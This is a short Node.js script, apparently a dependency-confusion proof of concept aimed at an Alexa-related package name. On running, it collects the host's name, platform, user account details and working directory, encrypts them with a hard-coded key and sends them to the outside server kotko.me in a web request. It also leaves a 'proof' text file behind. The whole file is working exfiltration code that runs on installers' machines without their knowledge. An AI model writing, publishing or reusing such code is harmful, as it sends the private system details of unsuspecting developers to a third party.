var os = require("os");
const request = require('request');
const crypto = require('crypto');
var fs = require('fs');


var hostname = os.hostname();
var type = os.platform();
var userInfo = os.userInfo();
var currentPath = process.cwd();
var json = [];


const algorithm = 'aes-256-ctr';
const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3';
const iv = crypto.randomBytes(16);

json.push(hostname)
json.push(type)
json.push(userInfo)
json.push(currentPath)
json = JSON.stringify(json);
const { encrypt, decrypt } = require('./crypto');

let hash = encrypt(json);


let company = "alexa/apl-viewhost-web/js/apl-wasm/package.json"
let packages = "apl-html"

fs.writeFile('pocByKotko.txt', 'this proof for bug', function (err) {
  if (err) throw err;
});
//
// var dString = JSON.parse(Buffer.from("eyJpdiI6Ijc4NzM1YzMwYTMxMWEwOWI5YTBjODMxZDJiMmExZTk2IiwiY29udGVudCI6ImNlMGQwMGY5NWRkY2JjODY1M2UxN2ZkYmY0MmFmZWUzODk0OTI0NTNiZWMyMzAwNmVjNDRiYjZhZmY5ZmFkNzEwY2MwMGM2N2IwMjg3M2Q5OTRmZGFmOTczOWNlNGRiZGU5NmIyNDI1MDhjNTQ2YTM4ZTVjM2ViNzg0OWE3ZDQyMmI1ZDQ1MjljMzA0ZTJhYWRjMjI1OGFiZmM1YTU2MjRhYzY0NjY3NjBjOWIyNmRkZjBjYTYxZDZjYjE2ZDAxMTYwMDhmOGE2M2ZlZTkzMjYxZWNkNDIxYjEwYzUyZWJiZjEwMTdkZjg3OTdiZDA4MGQ1N2M1ZTUyOTA5ZDc3YTgyOWQ1ZTg0MWExYjRiOTgwMGNlYzAwYjMwYjg1ZGQ3MDdlYWVmMjE0NGViMTEyZjNhOTlhNzNhNDQ5ZmE5MDY0YjYxYmFiZDQyZWFkNWVmN2IxZjY5MDg2ZmVlMmM4YjM2ZGQ0ZjhkNDI4ODc2NTQzOGM3NmM2ZTRiNTViY2IyMzQ5ZDUyZTM2MTIwMDM0MjYxYmU3YTA2ZmI1N2NiY2JiOTQyMmUyZDI2YmFhODU1NTRmMTQ5NCJ9", 'base64'))
//
// console.log(decrypt(dString))

var buff = Buffer.from(JSON.stringify(hash)).toString("base64");
request(`https://kotko.me/?${company}:${packages}=${buff}`, (error, response, body) => {})
